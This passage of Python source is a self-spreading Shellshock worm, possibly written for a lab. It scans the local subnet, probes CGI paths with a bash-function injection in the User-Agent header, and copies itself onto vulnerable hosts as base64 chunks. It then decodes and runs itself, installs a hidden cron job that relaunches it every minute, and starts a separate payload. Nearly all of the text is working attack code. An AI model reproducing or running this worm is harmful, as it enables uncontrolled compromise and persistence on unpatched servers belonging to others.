'/webtools/bonsai/cvsblame.cgi', '/webtools/bonsai/cvslog.cgi', '/webtools/bonsai/cvsquery.cgi', '/webtools/bonsai/cvsqueryform.cgi', '/webtools/bonsai/showcheckins.cgi', '/wwwadmin.cgi', '/wwwboard.cgi', '/wwwboard/wwwboard.cgi']

# Encode worm source code and break into chunks for injection
n = 5000
data = open(worm_source, 'rb').read()
encoded = base64.b64encode(data).decode()
worm64 = [encoded[i:i+n] for i in range(0, len(encoded), n)]

# Worm tracking
def log():
	timestamp = datetime.now().strftime("%m-%d-%Y %H:%M:%S.%f")
	hostinfo = os.uname()

	f = open(f'{folder}/log','w')
	f.write(f'{timestamp}\n{hostinfo}\n')
	f.close()

# Creates a copy of the payload on host
def copy_payload():
	if not os.path.exists(folder):
		os.mkdir(folder)

	# If payload is already on host, then exit program
	try:
		f = open(payload_location,'x')
		f.write(payload_content)
		f.close()
		os.system(f"base64 -d {folder}/.payload > {folder}/payload")
	except:
		sys.exit(0)

# Executes payload on host
def execute_payload():
	#exec(open(payload_location).read())
	try:
		subprocess.Popen(['/usr/local/bin/python3', f'{folder}/payload'])
		log()
	except FileNotFoundError:
		pass

# Has the target been wormed?
def already_wormed(target): # Pass in target as argument
	# url = 'http://192.168.56.111/cgi-bin/shock.sh' # Test
	cmd = 'ls -la /tmp'

	check = 'curl -s -H \"user-agent: () { :; }; echo; echo; /bin/bash -c '
	check += '\'' + cmd + '\'"'
	check += ' ' + target

	# Gets output of curl request
	a = subprocess.run(check, shell=True, stdout=subprocess.PIPE).stdout.decode()

	if '.dirt' in a:
		return True
	return False

# Inject worm to target and executes worm on target
def inject(target, cmd_list): # Pass in target as argument
	# url = 'http://192.168.56.111/cgi-bin/shock.sh' # Test

	for cmd in cmd_list:
	# curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c '{cmd}'" {target}
		exploit = 'curl -s -H \"user-agent: () { :; }; echo; echo; /bin/bash -c '
		exploit += '\'' + cmd + '\'"'
		exploit += ' ' + target + ' > /dev/null'
		subprocess.run(exploit, shell=True)

# Prototype for shellshock exploit
def spread(targets):
	# targets = ['http://192.168.56.111/cgi-bin/shock.sh'] # Hardcoding this for now

	# List of commands for RCE
	cmd_list = []

	# Worm copying itself on vulnerable host
	cmd_list.append(f'mkdir {folder}')
	for chunk in worm64:
		cmd_list.append(f'echo {chunk} >> {folder}/.worm64')
	cmd_list.append(f'/usr/bin/base64 -d {folder}/.worm64 > {folder}/worm.py')
	cmd_list.append(f'/bin/chmod 777 {folder}/worm.py')

	# Create bash script that adds cron job to execute worm every minute
	cmd_list.append(f'echo IyEvYmluL2Jhc2gKY3Jvbj0iKi8xICogKiAqICogL3Vzci9sb2NhbC9iaW4vcHl0aG9uMyAvdG1wLy5kaXJ0L3dvcm0ucHkiCmVjaG8gIiRjcm9uIiB8IGNyb250YWIgLQ== > {folder}/.cron')
	cmd_list.append(f'/usr/bin/base64 -d {folder}/.cron > {folder}/cron.sh')
	cmd_list.append(f'/bin/chmod 777 {folder}/cron.sh')
	cmd_list.append(f'{folder}/cron.sh')

	for target in targets:
		if not already_wormed(target):
			inject(target, cmd_list)

# Host discovery on local network
# TODO: Identify subnet and adjust scan for different subnets
def local_ip_finder():
	local_ips = []
	subprocess.run(f"ifconfig | grep inet | head -n 1 | sed 's/^[ ]*//;s/[ ]*$//' | cut -d ' ' -f2 | cut -d ':' -f2 | cut -d '.' -f 1-3 > {folder}/ip.txt", shell=True)
	#subprocess.run(f"echo 192.168.56 > {folder}/ip.txt", shell=True) # Hardcode, for testing purposes
	part_local_ip = open(f"{folder}/ip.txt", "r").read().strip() # This will output an IP format of XXX.XXX.XXX

	FNULL = open(os.devnull, 'w') # Hide output of ping

	for x in range(ip_range_min, ip_range_max): # CHANGE THIS to 1,255 for final
		full_local_ip = part_local_ip + "." + str(x)
		#for y in range(1,255): # If I want to search ip XXX.XXX.yyy.yyy
		#	full_local_ip = subnet_local_ip + "." + str(y)
		ping_ip = subprocess.call(['ping', '-q', '-c', '1', "-W", "1", full_local_ip], stdout=FNULL)
		if ping_ip == 0:
			local_ips.append(full_local_ip)
		else:
			pass

	FNULL.close()

	f = open(f'{folder}/log','a')
	f.write(f'Hosts Discovered: {local_ips}\n')
	f.close()

	return local_ips

# Search for vulnerable hosts
def vuln_check(local_ips):
	vuln_url_path = []
	cmd = "echo 123foo123"
	# url = "http://192.168.220.128/cgi-bin/hello.sh"
	# print(list_of_ip)
	for ip in local_ips:
		for uri in cgi_list:
			url = f'http://{ip}{uri}'
			exploit = 'curl -f -s --max-time 3 -H \"user-agent: () { :; }; echo; echo; /bin/bash -c '
			exploit += '\'' + cmd + '\'"'
			exploit += ' ' + url
			#print(exploit)
			output = subprocess.getoutput(exploit)
			if "123foo123" in str(output):
				vuln_url_path.append(url)

	f = open(f'{folder}/log','a')
	f.write(f'Vulnerable URLs: {vuln_url_path}\n')
	f.close()

	return vuln_url_path #Final list of vuln urls


# USAGE:
# ./worm.py
#
# Optional arguments:
# ./worm.py [vulnerable_path] [v]
# ./worm.py http://192.168.56.111/cgi-bin/shock.sh
# ./worm.py http://192.168.56.111/cgi-bin/shock.sh v
#
# vulnerable_path: full path to page vulnerable to shellshock
# v: verbose

def main():

	# Introducing verbose and targeted options for worm
	# TODO: Cleaner implementation of this whole thing
	verbose = False
	targeted = False

	args = sys.argv[1:]
	if 'v' in args:
		verbose = True
	if len(args) > 0:
		if len(args[0]) > 1:
			target = sys.argv[1]
			targeted = True

	if targeted:
		# TODO: Clean up implementation to check for vuln given full URL
		cmd = "echo 123foo123"
		a = 'curl -f -s --max-time 3 -H \"user-agent: () { :; }; echo; echo; /bin/bash -c '
		a += '\'' + cmd + '\'"'
		a += ' ' + target
		output = subprocess.getoutput(a)

		if verbose:
			print(f'Attempting to spread worm to {target}...')
			if already_wormed(target):
				print(f'{target} is already wormed!')
			elif "123foo123" not in str(output):
				print(f'{target} is not vulnerable.')
			else:
				spread(target)
				print(f'Worm injected via {target}.')
		else:
			spread(target)

	elif verbose:
		print('... Scanning local network for Hosts ...')
		local_ips = local_ip_finder()
		print(f'Hosts discovered: {local_ips}\n')

		print('... Searching for Shellshock vulnerability on hosts ...')
		targets = vuln_check(local_ips)
		print(f'Vulnerable: {targets}\n')

		print('... Exploiting vulnerable hosts ...')
		spread(targets)
		print('... Exploit Complete ...')

	else:
		copy_payload()
		execute_payload()

		# Scan local network for IPs and finds shellshock-vulnerable URLs
		local_ips = local_ip_finder()
		targets = vuln_check(local_ips)

		# Try to spread to vulnerable hosts
		spread(targets)

main()
